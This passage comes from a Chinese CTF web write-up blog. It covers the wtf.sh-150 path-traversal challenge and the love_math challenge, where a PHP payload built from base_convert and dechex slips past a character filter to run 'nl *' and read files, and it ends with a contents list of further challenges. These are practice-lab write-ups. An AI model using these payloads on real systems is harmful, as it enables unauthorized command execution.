class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p>关键的是这两行，需要以<code>.wtf</code>结尾，需要以<code>$</code>开头</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">\n   <span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span> <span class=\"token string\">\"<span class=\"token variable\">$&#123;pathname<span class=\"token operator\">:</span>(-4)&#125;</span>\"</span> <span class=\"token operator\">=</span> <span class=\"token string\">'.wtf'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span> <span class=\"token string\">\"$\"</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"<span class=\"token variable\">$&#123;line<span class=\"token operator\">:</span>0<span class=\"token operator\">:</span>1&#125;</span>\"</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$&#123;can_execute&#125;</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p>接着就需要找到哪里可以上传<code>.wtf</code>文件</p>\n</li>\n</ul>\n<p><img src=\"/../CTF-web-wp/69.png\" alt=\"image.png\"></p>\n<ul>\n<li>这里也就是可以把<code>username</code>输出到<code>next_file</code>中</li>\n<li>那么我可以在<code>username</code>中写可执行的命令，然后，如果这里可以目录穿越，那我用目录穿越<strong>创建一个文件</strong></li>\n</ul>\n<p><img src=\"/../CTF-web-wp/70.png\" alt=\"image.png\"></p>\n<ul>\n<li><p>**这里我想不明白为什么要这样写            **<br>:::tip<br><strong>m.wtf后面要加%09,表示制表符,否则会被当做目录去解析</strong><br>:::</p>\n</li>\n<li><p>再创建一个用户，这样就可以了</p>\n</li>\n</ul>\n<p><img src=\"/../CTF-web-wp/71.png\" alt=\"image.png\"></p>\n<h1 id=\"攻防世界-love-math-难度8-命令执行\"><a href=\"#攻防世界-love-math-难度8-命令执行\" class=\"headerlink\" title=\"攻防世界 love_math(难度8)命令执行\"></a>攻防世界 love_math(难度8)命令执行</h1><h2 id=\"思路-20\"><a href=\"#思路-20\" class=\"headerlink\" title=\"思路\"></a>思路</h2><ul>\n<li>好久好久没做这种上来就给源码的，命令执行的题了，很像ctfshow的风格</li>\n<li>我想的就是能不能用函数名拼接成<code>system</code>，但是单引号被过滤了，显然不行</li>\n<li>这里我就没有再往下想一步，函数名不行，但是可以看函数的返回值呀</li>\n</ul>\n<h2 id=\"wp-20\"><a href=\"#wp-20\" class=\"headerlink\" title=\"wp\"></a>wp</h2><ul>\n<li>逐个查每个函数的文档，查到<code>base_convert</code>这个函数</li>\n</ul>\n<p><img src=\"/../CTF-web-wp/72.png\" alt=\"image.png\"></p>\n<ul>\n<li><p>也就是现在可以构造任意的字母和数字，</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"> <span class=\"token comment\">// $oct = \"hex2bin\";</span>\n<span class=\"token variable\">$oct</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"phpinfo\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$dec</span> <span class=\"token operator\">=</span> <span class=\"token function\">base_convert</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$oct</span><span class=\"token punctuation\">,</span><span class=\"token number\">36</span><span class=\"token punctuation\">,</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p>试一下phpinfo，是可以执行的</p>\n</li>\n</ul>\n<p><img src=\"/../CTF-web-wp/73.png\" alt=\"image.png\"></p>\n<ul>\n<li>那我想<code>system ls</code>，这个就也是直接构造就行了</li>\n</ul>\n<p><img src=\"/../CTF-web-wp/74.png\" alt=\"image.png\"></p>\n<ul>\n<li>但是我想查看<code>flag</code>，这里需要用<code>nl *</code>，想到可以对他进行16进制编码，变成只有数字和小写字母组成的</li>\n<li>那就还需要一个函数把它变成二进制字符串，也就是需要构造一个hex2bin函数<br>:::tip<br>这里的二进制字符串就理解成普通字符串，是对二进制流ASCII编码的显示结果</li>\n</ul>\n<p>:::</p>\n<ul>\n<li>这里会太长，那就构造一个变量</li>\n</ul>\n<p><img src=\"/../CTF-web-wp/75.png\" alt=\"a5836a983201254b4b196edb8b9e02f.jpg\"></p>\n<ul>\n<li>最终payload<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token punctuation\">(</span><span class=\"token variable\">$pi</span><span class=\"token operator\">=</span>base_convert<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token number\">128891498</span><span class=\"token punctuation\">,</span><span class=\"token number\">14</span><span class=\"token punctuation\">,</span><span class=\"token number\">36</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$pi</span><span class=\"token punctuation\">(</span><span class=\"token number\">1438255411</span><span class=\"token punctuation\">,</span><span class=\"token number\">14</span><span class=\"token punctuation\">,</span><span class=\"token number\">34</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token function\">dechex</span><span class=\"token punctuation\">(</span><span class=\"token number\">1852579882</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></li>\n</ul>\n<h2 id=\"总结-10\"><a href=\"#总结-10\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>:::tip</p>\n<ul>\n<li>nl * 可以查看所有文件的内容</li>\n<li>16进制编码可以绕过对字符的限制</li>\n<li>php的函数<ul>\n<li>base_convert函数</li>\n<li>hex2bin函数</li>\n<li>getallheaders函数</li>\n</ul>\n</li>\n<li>php的异或<br>:::<br><a href=\"https://blog.csdn.net/weixin_44604541/article/details/108914188\">攻防世界 web高手进阶区 8分题 love_math_攻防世界love_math_思源湖的鱼的博客-CSDN博客</a></li>\n</ul>\n","text":"比赛经验 ssrf 服务器端请求伪造（SSRF）是指攻击者能够从易受攻击的Web应用程序发送精心设计的请求的对其他网站进行攻击。(利用一个可发起网络请求的服务当作跳板来攻击其他服务) 攻击者能够利用目标帮助攻击者访问其他想要攻击的目标 攻击者要求服务器为他访问URL 可用于内网访...","link":"","photos":[],"count_time":{"symbolsCount":"24k","symbolsTime":"21 mins."},"categories":[],"tags":[{"name":"CTF","slug":"CTF","count":4,"path":"api/tags/CTF.json"},{"name":"web","slug":"web","count":2,"path":"api/tags/web.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%AF%94%E8%B5%9B%E7%BB%8F%E9%AA%8C\"><span class=\"toc-text\">比赛经验</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#ssrf\"><span class=\"toc-text\">ssrf</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#netstate\"><span class=\"toc-text\">netstate</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%9C%AC%E5%9C%B0%E6%B5%8B%E8%AF%95\"><span class=\"toc-text\">本地测试</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%BE%8B%E9%A2%98\"><span class=\"toc-text\">例题</span></a></li></ol></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%81%9A%E9%A2%98%E6%80%9D%E8%B7%AF\"><span class=\"toc-text\">做题思路</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%8F%90%E9%86%92%E8%87%AA%E5%B7%B1\"><span class=\"toc-text\">提醒自己</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%AD%98%E5%9C%A8%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A\"><span class=\"toc-text\">存在目录穿越</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%9C%89%E6%8F%90%E7%A4%BA%E7%9A%84%E5%9C%B0%E6%96%B9\"><span class=\"toc-text\">有提示的地方</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#linux%E7%9A%84%E5%85%B3%E9%94%AE%E7%9B%AE%E5%BD%95\"><span class=\"toc-text\">linux的关键目录</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E8%AF%AD%E8%A8%80%E6%88%96%E8%80%85%E6%A1%86%E6%9E%B6\"><span class=\"toc-text\">语言或者框架</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#pl\"><span class=\"toc-text\">.pl</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#JSESSIONID\"><span class=\"toc-text\">JSESSIONID</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#fuzz%E6%B5%8B%E8%AF%95\"><span class=\"toc-text\">fuzz测试</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%8C%E5%8F%AF%E4%BB%A5%E6%9F%A5%E7%9C%8B%E6%BA%90%E7%A0%81\"><span class=\"toc-text\">存在文件包含，可以查看源码</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x01\"><span class=\"toc-text\">0x01</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x02\"><span class=\"toc-text\">0x02</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\"><span class=\"toc-text\"></span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#-1\"><span class=\"toc-text\"></span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%89%BE%E5%88%B0%E5%8F%AF%E4%BB%A5%E4%BA%A4%E4%BA%92%E7%9A%84%E5%9C%B0%E6%96%B9\"><span class=\"toc-text\">找到可以交互的地方</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#sql%E6%B3%A8%E5%85%A5%E9%A2%98\"><span class=\"toc-text\">sql注入题</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E9%A2%98%E6%AD%A5%E9%AA%A4\"><span class=\"toc-text\">解题步骤</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9\"><span class=\"toc-text\">找注入点</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%B3%A8%E5%85%A5%E7%82%B9%E6%98%AF%E7%99%BB%E9%99%86%E4%B9%8B%E5%90%8E%E7%9A%84%E4%BF%A1%E6%81%AF\"><span class=\"toc-text\">注入点是登陆之后的信息</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%B5%8B%E8%AF%95%E5%8F%AF%E7%94%A8%E7%9A%84%E5%AD%97%E7%AC%A6\"><span class=\"toc-text\">测试可用的字符</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%91%BD%E4%BB%A4%E9%97%AD%E5%90%88\"><span class=\"toc-text\">命令闭合</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#insert-%E8%AF%AD%E5%8F%A5\"><span class=\"toc-text\">insert 语句</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#addslashes\"><span class=\"toc-text\">addslashes</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%A2%98\"><span class=\"toc-text\">文件上传题</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#nginx\"><span class=\"toc-text\">nginx</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%B8%80%E7%9B%B4%E6%8F%90%E7%A4%BA%E9%9C%80%E8%A6%81%E7%99%BB%E9%99%86\"><span class=\"toc-text\">一直提示需要登陆</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%9C%89%E6%BA%90%E7%A0%81%E7%9A%84\"><span class=\"toc-text\">有源码的</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-very-easy-sql-%E9%9A%BE%E5%BA%A63-ssrf\"><span class=\"toc-text\">攻防世界 very_easy_sql(难度3) ssrf</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF\"><span class=\"toc-text\">思路</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#wp\"><span class=\"toc-text\">wp</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%9F%A5%E7%9C%8B%E6%BA%90%E7%A0%81%E5%8F%91%E7%8E%B0curl\"><span class=\"toc-text\">查看源码发现curl</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#gopher-%E5%BC%B1%E5%AF%86%E7%A0%81%E7%99%BB%E5%BD%95\"><span class=\"toc-text\">gopher+弱密码登录</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#cookie%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">cookie注入</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%BB%E7%BB%93\"><span class=\"toc-text\">总结</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mfw-%E9%9A%BE%E5%BA%A63-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\"><span class=\"toc-text\">攻防世界 mfw(难度3)代码审计</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF-1\"><span class=\"toc-text\">思路</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#wp-1\"><span class=\"toc-text\">wp</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%BB%E7%BB%93-1\"><span class=\"toc-text\">总结</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fakebook-%E9%9A%BE%E5%BA%A63-sql%E6%B3%A8%E5%85%A5-ssrf\"><span class=\"toc-text\">攻防世界 fakebook(难度3)sql注入+ssrf</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF-2\"><span class=\"toc-text\">思路</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#wp-2\"><span class=\"toc-text\">wp</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%BB%E7%BB%93-2\"><span class=\"toc-text\">总结</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-ics-05-%E9%9A%BE%E5%BA%A63-php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%9F%A5%E7%9C%8B%E6%BA%90%E7%A0%81\"><span class=\"toc-text\">攻防世界 ics-05(难度3)php伪协议查看源码</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF-3\"><span class=\"toc-text\">思路</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#wp-3\"><span class=\"toc-text\">wp</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-simple-js-%E9%9A%BE%E5%BA%A63-js%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\"><span class=\"toc-text\">攻防世界 simple-js(难度3)js代码审计</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF-4\"><span class=\"toc-text\">思路</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#wp-4\"><span class=\"toc-text\">wp</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-easytornado-%E9%9A%BE%E5%BA%A63-SSTI\"><span class=\"toc-text\">攻防世界 easytornado(难度3) SSTI</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#wp-5\"><span class=\"toc-text\">wp</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-shrine-%E9%9A%BE%E5%BA%A63-SSTI\"><span class=\"toc-text\">攻防世界 shrine(难度3) SSTI</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF-5\"><span class=\"toc-text\">思路</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#wp-6\"><span class=\"toc-text\">wp</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%BB%E7%BB%93-3\"><span class=\"toc-text\">总结</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-wife-wife-%E9%9A%BE%E5%BA%A64-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93\"><span class=\"toc-text\">攻防世界 wife_wife(难度4) 原型链污染</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF-6\"><span class=\"toc-text\">思路</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#wp-7\"><span class=\"toc-text\">wp</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Cat-%E9%9A%BE%E5%BA%A64-django\"><span class=\"toc-text\">攻防世界 Cat(难度4) django</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF-7\"><span class=\"toc-text\">思路</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#wp-8\"><span class=\"toc-text\">wp</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#fuzz%E6%B5%8B%E8%AF%95-1\"><span class=\"toc-text\">fuzz测试</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B5%8B%E8%AF%95\"><span class=\"toc-text\">宽字节测试</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#django%E7%9A%84%E7%89%B9%E6%AE%8A%E7%9F%A5%E8%AF%86\"><span class=\"toc-text\">django的特殊知识</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%BB%E7%BB%93-4\"><span class=\"toc-text\">总结</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Confusion1-%E9%9A%BE%E5%BA%A64-SSTI\"><span class=\"toc-text\">攻防世界 Confusion1(难度4) SSTI</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF-8\"><span class=\"toc-text\">思路</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%BB%E7%BB%93-5\"><span class=\"toc-text\">总结</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-FlatScience-%E9%9A%BE%E5%BA%A64-SQlite%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">攻防世界 FlatScience(难度4)SQlite注入</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF-9\"><span class=\"toc-text\">思路</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#wp-9\"><span class=\"toc-text\">wp</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E8%84%9A%E6%9C%AC\"><span class=\"toc-text\">脚本</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%BB%E7%BB%93-6\"><span class=\"toc-text\">总结</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-md5%E7%88%86%E7%A0%B4-file%E5%8D%8F%E8%AE%AE%E8%AF%BB\"><span class=\"toc-text\">攻防世界 md5爆破+file协议读</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF-10\"><span class=\"toc-text\">思路</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#wp-10\"><span class=\"toc-text\">wp</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#apache%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6\"><span class=\"toc-text\">apache配置文件</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#url%E4%BA%8C%E6%AC%A1%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87%E5%AF%B9flag%E7%9A%84%E8%BF%87%E6%BB%A4\"><span class=\"toc-text\">url二次编码绕过对flag的过滤</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-warmup-%E9%9A%BE%E5%BA%A64-sql%E6%B3%A8%E5%85%A5-%E5%88%AB%E5%90%8D\"><span class=\"toc-text\">攻防世界 warmup(难度4) sql注入-别名</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF-11\"><span class=\"toc-text\">思路</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#wp-11\"><span class=\"toc-text\">wp</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-BadProgrammer-%E9%9A%BE%E5%BA%A65-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93\"><span class=\"toc-text\">攻防世界 BadProgrammer(难度5)原型链污染</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF-12\"><span class=\"toc-text\">思路</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#wp-12\"><span class=\"toc-text\">wp</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#ctfshow-web681-sql%E6%B3%A8%E5%85%A5-%E8%BD%AC%E4%B9%89\"><span class=\"toc-text\">ctfshow web681 sql注入-\\转义</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF-13\"><span class=\"toc-text\">思路</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#wp-13\"><span class=\"toc-text\">wp</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%BB%E7%BB%93-7\"><span class=\"toc-text\">总结</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#ctfshow-web682-js%E7%88%86%E7%A0%B4\"><span class=\"toc-text\">ctfshow web682(js爆破)</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF-14\"><span class=\"toc-text\">思路</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#wp-14\"><span class=\"toc-text\">wp</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-i-got-id-200-%E9%9A%BE%E5%BA%A66-perl%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0\"><span class=\"toc-text\">攻防世界 i-got-id-200(难度6) perl文件上传</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF-15\"><span class=\"toc-text\">思路</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#wp-15\"><span class=\"toc-text\">wp</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%A4%84%E7%90%86%E6%AF%8F%E4%B8%AA%E6%96%87%E4%BB%B6\"><span class=\"toc-text\">处理每个文件</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%BB%E7%BB%93-8\"><span class=\"toc-text\">总结</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-comment-%E9%9A%BE%E5%BA%A67-git%E6%BA%90%E7%A0%81%E8%A1%A5%E5%85%A8\"><span class=\"toc-text\">攻防世界 comment(难度7) git源码补全</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF-16\"><span class=\"toc-text\">思路</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#wp-16\"><span class=\"toc-text\">wp</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#git%E6%BA%90%E7%A0%81%E6%81%A2%E5%A4%8D\"><span class=\"toc-text\">git源码恢复</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-filemanager-%E9%9A%BE%E5%BA%A67\"><span class=\"toc-text\">攻防世界 filemanager(难度7)</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF-17\"><span class=\"toc-text\">思路</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#addslashes-1\"><span class=\"toc-text\">addslashes</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#wp-17\"><span class=\"toc-text\">wp</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%BB%E7%BB%93-9\"><span class=\"toc-text\">总结</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web-php-wrong-nginx-config-%E9%9A%BE%E5%BA%A67\"><span class=\"toc-text\">攻防世界 Web_php_wrong_nginx_config(难度7)</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF-18\"><span class=\"toc-text\">思路</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#wp-18\"><span class=\"toc-text\">wp</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-wtf-sh-150-%E9%9A%BE%E5%BA%A67-%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A-shell%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1\"><span class=\"toc-text\">攻防世界 wtf.sh-150(难度7)目录穿越+shell源码审计</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF-19\"><span class=\"toc-text\">思路</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#wp-19\"><span class=\"toc-text\">wp</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" 